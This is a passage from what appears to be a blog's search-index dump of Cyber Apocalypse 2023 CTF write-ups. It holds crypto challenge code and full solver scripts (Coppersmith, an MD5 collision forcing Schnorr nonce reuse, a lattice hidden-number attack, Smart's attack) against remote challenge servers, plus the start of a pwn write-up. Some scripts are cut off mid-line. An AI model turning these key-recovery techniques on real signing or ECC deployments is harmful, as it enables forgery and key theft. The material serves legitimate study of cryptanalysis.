long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad from sage.all_cmdline import * FLAG = b'flag{fake_flag}' class ECC: def __init__(self, bits): self.p = getPrime(bits) self.a = randint(1, self.p) self.b = randint(1, self.p) def gen_random_point(self): return EllipticCurve(GF(self.p), [self.a, self.b]).random_point() def menu(): print(\"1. Get parameters of path\") print(\"2. Try to exit the labyrinth\") option = input(\"\u003e \") return option def main(): ec = ECC(512) print(f'{ec.p = }') print(f'{ec.a = }') print(f'{ec.b = }') A = ec.gen_random_point() print(\"This is the point you calculated before:\") print(json.dumps({'x': hex(A[0]), 'y': hex(A[1])})) while True: choice = menu() if choice == '1': r = randint(ec.p.bit_length() // 3, 2 * ec.p.bit_length() // 3) print( json.dumps({ 'r': r, 'p': hex(ec.p), 'a': hex(ec.a \u003e\u003e r), 'b': hex(ec.b \u003e\u003e r) })) elif choice == '2': iv = os.urandom(16) key = sha256(long_to_bytes(pow(ec.a, ec.b, ec.p))).digest()[:16] cipher = AES.new(key, AES.MODE_CBC, iv) flag = pad(FLAG, 16) print( json.dumps({ 'iv': iv.hex(), 'enc': cipher.encrypt(flag).hex() })) else: print('Bye.') exit() if __name__ == '__main__': main() However, it’s important to remember that we actually have a leak for the a and b parameters, which are their most significant bits (MSBs). Thus, we can use that leak to retrieve them. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:4:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Solution Let’s take a look at how the leak is generated. r = randint(ec.p.bit_length() // 3, 2 * ec.p.bit_length() // 3) print( json.dumps({ 'r': r, 'p': hex(ec.p), 'a': hex(ec.a \u003e\u003e r), 'b': hex(ec.b \u003e\u003e r) }) ) Notice that the p.bit_length() is 512. Therefore, the range of r is from 170 to 340, which can be bruteforced. It is important to remember that the ECC equation is as follows: $$ y^2 = x^3 + ax + b \\mod p $$ And with our leak, the equation can be rearranged as follows: $$ y^2 = x^3 + (2^ra_{leaked} + c) + {2^rb_{leaked} + d} \\mod p $$ Notice that the value of r is bruteforce-able, and the values of $c$ and $d$ are small compared to the other values ($y^2$, $x^3$, and $2^r$). In this type of challenge, we can try to retrieve the values of $c$ and $d$ value with Coppersmith. We can reuse the defund implementation of coppersmith to perform the coppersmith attack on the equation. After retrieving the value $c$ and $d$, we will be able to recover the values of $a$ and $b$. Below is my solver script (sage script): from pwn import * import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad import itertools def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] r = remote(b'165.232.100.46', int(31844)) # Retrieve x y r.recvuntil(b':\\n') xy_out = json.loads(r.recvline().strip()) x, y = int(xy_out['x'], 16), int(xy_out['y'], 16) # Retrieve partial_a and partial_b r.sendlineafter(b'\u003e ', b'1') out = json.loads(r.recvline().strip()) p = int(out['p'], 16) partial_a = int(out['a'], 16) partial_b = int(out['b'], 16) r.sendlineafter(b'\u003e ', b'2') enc_out = json.loads(r.recvline().strip()) iv = bytes.fromhex(enc_out['iv']) enc = bytes.fromhex(enc_out['enc']) ''' f(x) = x^3 - y^2 + (partial_a*2^r + c)*x + (partial_b*2^r + d) mod p c and d is small, r is bruteforceable bounds = [2^r, 2^r] ''' print(f'{p = }') for guess_r in range(p.bit_length() // 3, 2*p.bit_length() // 3): P.\u003cc, d\u003e = PolynomialRing(Zmod(p)) bound = 2^(guess_r) print(f'{guess_r = }') f = x^3 - y^2 + x*(partial_a*2^guess_r + c) + (partial_b*2^guess_r +d) bounds = (bound, bound) sols = small_roots(f, bounds, m = 7, d=3) if len(sols) \u003e 0: for sol in sols: sol_a = int(sol[0]) + partial_a*2^guess_r sol_b = int(sol[1]) + partial_b*2^guess_r key = sha256(long_to_bytes(pow(int(sol_a), int(sol_b), p))).digest()[:16] cipher = AES.new(key, AES.MODE_CBC, iv) print(f'Flag: {cipher.decrypt(enc)}') exit() Flag: HTB{y0u_5h0u1d_h4v3_u53d_c00p325m17h} ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:4:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Colliding Heritage Description As you arrive at the location of the relic, you discover an ancient tomb that appears to have no visible entrance. However, a scan of the area reveals the presence of unusual RF signals coming from a specific location. With the help of your team, you manage to create an interface to communicate with the signal-emitting device. Unfortunately, the device only grants access to descendants of the pharaoh’s left hand. Can you find a way to enter the tomb? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:5:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Initial Analysis For this challenge, we were given a file called server.py. Below is its code: #!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import md5 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = \"HTB{???????????????????????????}\" class MD5chnorr: def __init__(self): # while True: # self.q = getPrime(128) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x16dd987483c08aefa88f28147702e51eb self.q = (self.p - 1) // 2 self.g = 3 self.x = randbelow(self.q) self.y = pow(self.g, self.x, self.p) def H(self, msg): return bytes_to_long(md5(msg).digest()) % self.q def sign(self, msg): k = self.H(msg + long_to_bytes(self.x)) print(f'{k = }') r = pow(self.g, k, self.p) % self.q e = self.H(long_to_bytes(r) + msg) s = (k - self.x * e) % self.q return (s, e) def verify(self, msg, sig): s, e = sig if not (0 \u003c s \u003c self.q): return False if not (0 \u003c e \u003c self.q): return False rv = pow(self.g, s, self.p) * pow(self.y, e, self.p) % self.p % self.q ev = self.H(long_to_bytes(rv) + msg) return ev == e def menu(): print('[S]ign a message') print('[V]erify a signature') return input('\u003e ').upper()[0] def main(): md5chnorr = MD5chnorr() print('g:', md5chnorr.g) print('y:', md5chnorr.y) print('p:', md5chnorr.p) for _ in range(3): choice = menu() if choice == 'S': msg = bytes.fromhex(input('Enter message\u003e ')) if b'I am the left hand' in msg: print('No!') else: sig = md5chnorr.sign(msg) print('Signature:', sig) elif choice == 'V': msg = bytes.fromhex(input('Enter message\u003e ')) s = int(input('Enter s\u003e ')) e = int(input('Enter e\u003e ')) if md5chnorr.verify(msg, (s, e)): if msg == b'I am the left hand': print(FLAG) else: print('Valid signature!') else: print('Invalid signature!') else: print('Invalid choice...') if __name__ == '__main__': signal.alarm(30) main() So, we were given a server that implements a signature scheme with the Schnorr signature algorithm. The details of the algorithm can be read on Wikipedia. The challenge shares the public key of the signature scheme (g, y, and p), and gives us three chances to use the available menus: S, which is a menu to sign any message that we provide. There is a restriction that disallows messages containing the string I am the left hand. We get the s and e values as well, which are the signature. V, which is a menu to validate our signature of the message. If the signature is valid and the message is I am the left hand, it will print the flag. Therefore, the objective of this challenge is to retrieve the private key with two signatures that we obtain from the server so that we can sign the message I am the left hand, send it to the server, and retrieve the flag. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:5:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Solution Notice that in this kind of signature scheme, the vulnerability usually lies in the way it generates the k (nonce) value. The k generation cannot be weak because it can be used to retrieve the private key (x). As mentioned in the Wikipedia page that I shared before, reusing a nonce is disallowed in this kind of signature scheme. The reason is that we can recover the private key (x) if we use the same k during signing two different messages. Let’s take a look at the signing equations below to understand why we can recover k if it is being reused to sign different messages: $$ \\begin{align} s_1 = (k - xe_1) \\mod q \\\\ s_2 = (k - xe_2) \\mod q \\\\ \\end{align} $$ If we subtract the above equation, retrieving the value of $x$ becomes very easy because we know the value of $s_1$, $s_2$, $e_1$, $e_2$ and $q$. We can rearrange those two equations to retrieve $x$. $$ \\begin{align} (s_1 - s_2) = k - k - x(e_1e_2) \\mod q \\\\ x = -(s_1 - s_2)(e_1e_2)^{-1} \\mod q \\\\ \\end{align} $$ So, if we sign two different messages with the same k, we will be able to recover x and sign the required message. Now that we know that we need to somehow sign two different messages with the same k value, let’s take a look at how the k is generated. def H(self, msg): return bytes_to_long(md5(msg).digest()) % self.q def sign(self, msg): k = self.H(msg + long_to_bytes(self.x)) print(f'{k = }') r = pow(self.g, k, self.p) % self.q e = self.H(long_to_bytes(r) + msg) s = (k - self.x * e) % self.q return (s, e) Notice that the generation of k (nonce) is basically just md5(msg || x). As mentioned in many articles, it is easy to generate a hash collision with md5. Reading through this article helped me understand why the way this challenge generates k is weak. It is easy to generate a md5 hash collision, which means we can sign two different messages with the same k value due to the collision. After reading that article, I realized that it is pretty simple to exploit the weakness of md5. We just need to grab two strings that have md5 collisions and use that as our messages to be signed. However, we need to be careful because the msg that we send will be appended by the x as well. Therefore, we can’t send the raw msg to the server. As mentioned in the previous article, md5 pads the msg first with some bytes during hashing. Thus, we need to send the padded message to the server instead of raw msg. This ensures that before the md5 process the bytes of appended x, both of the messages that we sent will have the same md5 state. So, when the md5 algorithm tries to process the block of the appended x, the state will be the same, which means it will produce the same hash. Once we are able to produce the md5 collision, we can retrieve the private key x based on the previous equations that I explained because the k value is reused. Below is my full script to recover the flag (sage script): from pwn import * from hashlib import md5 from Crypto.Util.number import * # Use two strings that has md5 collisions m1 = bytes.fromhex('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2') m2 = bytes.fromhex('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2') assert m1 != m2 ''' After we properly padding the above string to follow the specification of MD5, (64-bytes per block), both of the string will produce the same state. So, if you append any same string, the produced hash will still be the same. # In this case, k = HASH(m11 || x) == HASH(m22 || x) will be the same. But, HASH(r || m11) != HASH(r || m22), because the 64-bytes block are different # So, if we sign this two message, it is basically the same case as re-used nonce k, which is vulnerable. Notice this. s2-s1 = k2-k1 - x(e2-e1) If k2 == k1, that means: x = -1 * (s2 - s1) * (e2-e1)^-1 ''' m11 = m1 + b\"\\x80\" + b\"\\x00\" * 55 + p64(0x200) m22 = m2 + b\"\\x80\" + b\"\\x00\" * 55 + p6","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:5:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Biased Heritage Description You emerge from the labyrinth to find a massive door blocking your path to the relic. It has the same authentication mechanism as the entrance, but it appears to be more sophisticated and challenging to crack. Can you devise a plan to breach the door and gain access to the relic? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:6:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Initial Analysis This is the upgraded challenge from the previous challenge (Colliding Heritage). Let’s try to see the given server.py #!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import sha256 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = \"HTB{???????????????????????????????????????}\" class SHA256chnorr: def __init__(self): # while True: # self.q = getPrime(512) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x184e26a581fca2893b2096528eb6103ac03f60b023e1284ebda3ab24ad9a9fe0e37b33eeecc4b3c3b9e50832fd856e9889f6c9a10cde54ee798a7c383d0d8d2c3 self.q = (self.p - 1) // 2 self.g = 3 self.x = randbelow(self.q) self.y = pow(self.g, self.x, self.p) def H(self, msg): return bytes_to_long(2 * sha256(msg).digest()) % self.q def sign(self, msg): k = self.H(msg + long_to_bytes(self.x)) r = pow(self.g, k, self.p) % self.q e = self.H(long_to_bytes(r) + msg) s = (k - self.x * e) % self.q return (s, e) def verify(self, msg, sig): s, e = sig if not (0 \u003c s \u003c self.q): return False if not (0 \u003c e \u003c self.q): return False rv = pow(self.g, s, self.p) * pow(self.y, e, self.p) % self.p % self.q ev = self.H(long_to_bytes(rv) + msg) return ev == e def menu(): print('[S]ign a message') print('[V]erify a signature') return input('\u003e ').upper()[0] def main(): sha256chnorr = SHA256chnorr() print('g:', sha256chnorr.g) print('y:', sha256chnorr.y) print('p:', sha256chnorr.p) for _ in range(3): choice = menu() if choice == 'S': msg = bytes.fromhex(input('Enter message\u003e ')) if b'right hand' in msg: print('No!') else: sig = sha256chnorr.sign(msg) print('Signature:', sig) elif choice == 'V': msg = bytes.fromhex(input('Enter message\u003e ')) s = int(input('Enter s\u003e ')) e = int(input('Enter e\u003e ')) if sha256chnorr.verify(msg, (s, e)): if msg == b'right hand': print(FLAG) else: print('Valid signature!') else: print('Invalid signature!') else: print('Invalid choice...') if __name__ == '__main__': signal.alarm(30) main() As you can see, the generation of k is changed. Now, it uses sha256 instead of md5. Up until now, there isn’t any collision found for sha256, which mean we can’t use our previous approach to solve this challenge. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:6:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Solution Reading through the Wikipedia again, it is mentioned that: Warning In fact, even slight biases in the value k or partial leakage of k can reveal the private key, after collecting sufficiently many signatures and solving the hidden number problem. So, there is another method to recover the private key x which involves exploiting a weak bias in the generation of k. Let’s take another look at the new method used to generate k and see if it has any biases. def H(self, msg): return bytes_to_long(2 * sha256(msg).digest()) % self.q def sign(self, msg): k = self.H(msg + long_to_bytes(self.x)) r = pow(self.g, k, self.p) % self.q e = self.H(long_to_bytes(r) + msg) s = (k - self.x * e) % self.q return (s, e) Notice that generation of k (nonce) is now 2 * sha256(msg || x). This is actually a weak generation. Even though the size of k is around 512 bits, the repeated sequence of bits in k reduces its entropy to only 256 bits. Therefore, k can be constructed as follows: $$ k = 2^{256}b + b \\\\ k = b(2^{256} + 1) \\\\ $$ where $b$ is the 256 bits produced by the sha256 hashing algorithm, so there are indeed biases in the generated k, and we might be able to recover it. This paper and writeup helped me a lot in understanding how to approach this problem. Basically, notice that the way of Schnorr signature mechanism works is actually similar to a hidden number problem. By incorporating the knowledge of how k is generated into the signature mechanism, we can obtain a new equation: $$ \\begin{align} s = k - xe \\mod q \\\\ s = b(2^{256}+1) - xe \\mod q \\\\ s - b(2^{256}+1) + xe = 0 \\mod q \\\\ \\end{align} $$ Notice that the $b$ value is actually smaller compared to the other value. Usually, in this kind of setup, we can construct a lattice and use LLL to recover an unknown value that we have in the above equation. I recommend reading the write-up I mentioned above to understand the details of how lattices work, but basically, I came up with this lattice after reading through the previous paper and write-up. $$ M = \\begin{bmatrix} 1 \u0026 0 \u0026 0 \u0026 0 \u0026 s_2 \u0026 s_1 \\\\ 0 \u0026 2/q \u0026 0 \u0026 0 \u0026 e_2 \u0026 e_1 \\\\ 0 \u0026 0 \u0026 1/B \u0026 0 \u0026 (B+1) \u0026 0 \\\\ 0 \u0026 0 \u0026 0 \u0026 1/B \u0026 0 \u0026 (B+1) \\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 q \u0026 0 \\\\ 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 q \\\\ \\end{bmatrix} $$ where $B = 2^{256}$ ($B$ is bound of the b value that we’re trying to recover). It is the same like previous challenge, where we can only retrieve two signatures from the server, which is why the lattice only contains signature 1 and 2. Using that lattice, we hope that that there exist a vector in the lattice that is small, which can be expressed as follows: $$ \\begin{pmatrix} 1 \u0026 \\frac{2x}{q} \u0026 \\frac{-b_2}{B} \u0026 \\frac{-b_1}{B} \u0026 0 \u0026 0 \\end{pmatrix} $$ And because the bit lengths of $x$, $q$, $b_2$, $B$, and $b_1$ is pretty much the same or close, we hope that the above vector is small enough for the lattice. To find that target vector, we can assume that if we’re trying to look for a vector in the lattice that is close to the following vector, $$ \\begin{pmatrix} 1 \u0026 1 \u0026 -1 \u0026 -1 \u0026 0 \u0026 0 \\end{pmatrix} $$ we will find our target vector. To find the approximation of it, we can use the Babai CVP algorithm. If we find the target vector, that means we have successfully recovered the private key x, and the rest of the steps are the same as the previous challenge. Below is my full script (Sage script). Note that due to the lack of signatures that we can collect (only 2), the script’s success rate is not 100%, so you might need to re-run the script multiple times. from secrets import randbelow from hashlib import sha256 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long from pwn import * import os ''' def H(self, msg): return bytes_to_long(2 * sha256(msg).digest()) % self.q Notice that the k generation is: - k = self.H(msg + long_to_bytes(self.x)) The Hash message is weak, because that means: k = b + 2^256*b = b(2^256+1) where b is the 256 bits generated by the sha256, and it is small enough compared to q This means, w","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:6:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Converging Visions Description As you hold the relic in your hands, it prompts you to input a coordinate. The ancient scriptures you uncovered near the pharaoh’s tomb reveal that the artifact is capable of transmitting the locations of vessels. The initial coordinate must be within proximity of the vessels, and an algorithm will then calculate their precise locations for transmission. However, you soon discover that the coordinates transmitted are not correct, and are encrypted using advanced alien techniques to prevent unauthorized access. It becomes clear that the true coordinates are hidden, serving only to authenticate those with knowledge of the artifact’s secrets. Can you decipher this alien encryption and uncover the genuine coordinates to locate the vessels and destroy them? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:7:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Initial Analysis On this challenge, we were given a file called server.py. Below is the contents of the code: from secret import FLAG, p, a, b from sage.all_cmdline import * class PRNG: def __init__(self, p, mul1, mul2): self.mod = p * 6089788258325039501929073418355467714844813056959443481824909430411674443639248386564763122373451773381582660411059922334086996696436657009055324008041039 self.exp = 2 self.mul1 = mul1 self.mul2 = mul2 self.inc = int.from_bytes(b'Coordinates lost in space', 'big') self.seed = randint(2, self.mod - 1) def rotate(self): self.seed = (self.mul1 * pow(self.seed, 3) + self.mul2 * self.seed + self.inc) % self.mod return self.seed, pow(self.seed, self.exp, self.mod) class Relic: def __init__(self, p, a, b): self.E = EllipticCurve(GF(p), [a, b]) self.P = None self.EP = None self.p = p self.prng = PRNG(p, a, b) def setupPoints(self, x): if x \u003e= self.p: return 'Coordinate greater than curve modulus' try: self.P = self.E.lift_x(Integer(x)) self.EP = self.P except: return 'Point not on curve' return ('Point confirmed on curve', self.P[0], self.P[1]) def nextPoints(self): seed, enc_seed = self.prng.rotate() self.P *= seed self.EP *= enc_seed return ('New Points', self.EP[0], self.EP[1], self.P[0], self.P[1]) def menu(): print('Options:\\n') print('1. Setup Point') print('2. Receive new point') print('3. Find true point') option = input('\u003e ') return option def main(): artifact = Relic(p, a, b) setup = False while True: try: option = menu() if option == '1': print('Enter x coordinate') x = int(input('x: ')) response = artifact.setupPoints(x) if response[0] == 'Point confirmed on curve': setup = True print(response) elif option == '2': if setup: response = artifact.nextPoints() print('Response') print((response[0], response[1], response[2])) else: print('Configure origin point first') elif option == '3': if setup: print('Input x,y') Px = int(input('x: ')) Py = int(input('y: ')) response = artifact.nextPoints() if response[3] == Px and response[4] == Py: print( 'You have confirmed the location. It\\'s dangerous however to go alone. Take this: ', FLAG) else: print('The vessels will never be found...') exit() else: print('Configure origin point first') else: print(\"Invalid option, sutting down\") exit() except Exception as e: response = f'An error occured: {e}' print(response) exit() if __name__ == '__main__': assert p.bit_length() == 256 main() As we can see in the code, the server is basically a combination of Elliptic Curve and PRNG. Let’s check the PRNG code first. class PRNG: def __init__(self, p, mul1, mul2): self.mod = p * 6089788258325039501929073418355467714844813056959443481824909430411674443639248386564763122373451773381582660411059922334086996696436657009055324008041039 self.exp = 2 self.mul1 = mul1 self.mul2 = mul2 self.inc = int.from_bytes(b'Coordinates lost in space', 'big') self.seed = randint(2, self.mod - 1) def rotate(self): self.seed = (self.mul1 * pow(self.seed, 3) + self.mul2 * self.seed + self.inc) % self.mod return self.seed, pow(self.seed, self.exp, self.mod) Well, this is just a usual PRNG, with an extra that it doesn’t only return the seed, but also the encrypted seed (encrypted with scheme similar to RSA rabin, which is $enc = \\text{seed}^2 \\mod (p*c)$, where $c$ is the constant hard-coded in the code). Now, let’s try to check the ECC class: class Relic: def __init__(self, p, a, b): self.E = EllipticCurve(GF(p), [a, b]) self.P = None self.EP = None self.p = p self.prng = PRNG(p, a, b) def setupPoints(self, x): if x \u003e= self.p: return 'Coordinate greater than curve modulus' try: self.P = self.E.lift_x(Integer(x)) self.EP = self.P except: return 'Point not on curve' return ('Point confirmed on curve', self.P[0], self.P[1]) def nextPoints(self): seed, enc_seed = self.prng.rotate() self.P *= seed self.EP *= enc_seed return ('New Points', self.EP[0], self.EP[1], self.P[0], self.P[1]) Okay, so to summarize: The Relic class uses the PRNG class as one of its attribute It also has two variables to st","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:7:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Solution Firstly, we don’t know the parameters of the curve yet (p, a, b). So, we need to recover them first. Notice that in the first menu, we can perform a binary search to find the p value, because if we provide an x value greater than p, the program will indicate that the x value is greater than the p value. Once we have recovered the p value, it is easy to obtain the a and b values. We just need to generate two points and then subtract them, just like what we did in the Elliptic Labyrinth Challenge. Below is the script that I used to recover the parameters (I used sagemath). from pwn import * r = remote('68.183.37.122', int(32073)) # Binary Search the p. I've changed the high and low value in here to speed up the process as # I've already retrieved the value before making this writeup. high = 91720173941422125335466921700213991383508377854521057423162397714341988797840 low = 91720173941422125335466921700213991383508377854521057423162397714341988797837 while high - low \u003e= 0: print(f'high, low = {high}, {low}') print(f'Curr diff: {high - low}') if high - low == 0: break mid = (high + low) // 2 r.sendlineafter(b'\u003e ', b'1') r.sendlineafter(b'x: ', str(mid).encode()) out = r.recvline() if b'greater' in out: # Too high high = mid else: low = mid + 1 p = high print(f'recovered p = {p}') def setup_point(x): r.sendlineafter(b'\u003e ', b'1') r.sendlineafter(b'x: ', str(x).encode()) _, x1, y1 = eval(r.recvline().strip()) return x1, y1 x1, y1 = setup_point(4) x2, y2 = setup_point(6) a = (((y1^2 - y2^2) - (x1^3 -x2^3))*inverse_mod(x1-x2, p)) % p b = (y1^2 - x1^3 - a*x1) % p print(f'recovered a = {a}') print(f'recovered b = {b}') E = EllipticCurve(GF(p), [a, b]) After we finally recovered the curve, the next step is to figure out how to recover the PRNG seed. In ECC, discrete logarithm is hard. So, if we have equation like $A = kB$ where $A$ and $B$ are points, $k$ is the multiplier, and we only know $A$ and $B$, we won’t be able to recover the $k$ value easily. However, for this challenge, in order to recover the seed value, we need to retrieve the enc_seed first. Even though we can setup the point (let’s call it A) via the first menu, and we can also get the EP value, which is EP = enc_seed*A, if the ECC is not weak, it won’t be possible for us to recover the enc_seed. However, after playing around with the curve, I noticed that the curve order is actually the same with the p used in the curve. sage: E.order() 91720173941422125335466921700213991383508377854521057423162397714341988797837 sage: E.order() == p True This is a weak curve that is vulnerable to Smart Attack. Below is the script that I used to perform the Smart Attack, taken from this github: # Lifts a point to the p-adic numbers. def _lift(E, P, gf): x, y = map(ZZ, P.xy()) for point_ in E.lift_x(x, all=True): _, y_ = map(gf, point_.xy()) if y == y_: return point_ def attack(G, P): \"\"\" Solves the discrete logarithm problem using Smart's attack. More information: Smart N. P., \"The discrete logarithm problem on elliptic curves of trace one\" :param G: the base point :param P: the point multiplication result :return: l such that l * G == P \"\"\" E = G.curve() gf = E.base_ring() p = gf.order() assert E.trace_of_frobenius() == 1, f\"Curve should have trace of Frobenius = 1.\" E = EllipticCurve(Qp(p), [int(a) + p * ZZ.random_element(1, p) for a in E.a_invariants()]) G = p * _lift(E, G, gf) P = p * _lift(E, P, gf) Gx, Gy = G.xy() Px, Py = P.xy() return int(gf((Px / Py) / (Gx / Gy))) gx, gy = setup_point(4) G = E(gx, gy) def next_point(): r.sendlineafter(b'\u003e ', b'2') if args.LOCAL: print(r.recvline().strip()) r.recvline().strip() _, x, y = eval(r.recvline().strip()) return x, y px, py = next_point() P = E(px, py) enc_seed = attack(G, P) print(f'recovered enc_seed: {enc_seed}') # enc_seed = seed^2 mod p By using the Smart attack, we will be able to recover the enc_seed, and now it’s time to move to the next part, which is recovering the seed from the known enc_seed. To retrieve the seed, it i","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:7:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":" Cyber Apocalypse 2023 For the past five days, I have been competing solo in the Cyber Apocalypse CTF 2023. During this time, I was able to solve all of the pwn challenges and 10 out of the 11 crypto challenges. In this writeup, I will be sharing my solutions for some of the pwn challenges that I solved. If you’re interested in reading about the crypto challenges, check out my other post. I was able to successfully clear all of the pwn challenges Pwn ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:0:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Labyrinth Description You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-pwn/:1:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","tcache","UDA","Buffer Overflow","ROP"],"title":"Cyber Apocalypse 2023: Pwn","uri":"/posts/cyber-apocalypse-2023-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary called labyrinth. Let’s start by analyzing the binary’s security measures using the checksec tool. Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) The binary has full RELRO, which means that the Global Offset Table (GOT) is read-only and cannot be modified. This prevents attackers from overwriting function pointers in the GOT to redirect program execution flow. There is no canary present, which means that there is no stack protection mechanism in place to detect stack-based buffer overflows. NX (No-eXecute) is enabled, which means that the stack and heap are marked as non-executable, preventing attackers from executing shellcode in these areas. The binary is not compiled with Position Independent Executable (PIE) enabled, which means that the binary address is constant and not randomized during runtime. Now, let’s disassemble the binary and take a closer look. main int __cdecl main(int argc, const char **argv, const char **envp) { char v4[8]; // [rsp+0h] [rbp-30h] BYREF __int64 v5; // [rsp+8h] [rbp-28h] __int64 v6; // [rsp+10h] [rbp-20h] __int64 v7; // [rsp+18h] [rbp-18h] char *s; // [rsp+20h] [rbp-10h] unsigned __int64 i; // [rsp+28h] [rbp-8h] setup(argc, argv, envp); banner(); *(_QWORD *)v4 = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0LL; fwrite(\"\\nSelect door: \\n\\n\", 1uLL, 0x10uLL, _bss_start); for ( i = 1LL; i \u003c= 0x64; ++i ) { if ( i \u003e 9 ) { if ( i \u003e 0x63 ) fprintf(_bss_start, \"Door: %d \", i); else fprintf(_bss_start, \"Door: 0%d \", i); } else { fprintf(_bss_start, \"Door: 00%d \", i); } if ( !(i % 0xA) \u0026\u0026 i ) putchar(10); } fwrite(\"\\n\u003e\u003e \", 1uLL, 4uLL, _bss_start); s = (char *)malloc(0x10uLL); fgets(s, 5, stdin); if ( !strncmp(s, \"69\", 2uLL) || !strncmp(s, \"069\", 3uLL) ) { fwrite( \"\\n\" \"You are heading to open the door but you suddenly see something on the wall:\\n\" \"\\n\" \"\\\"Fly like a 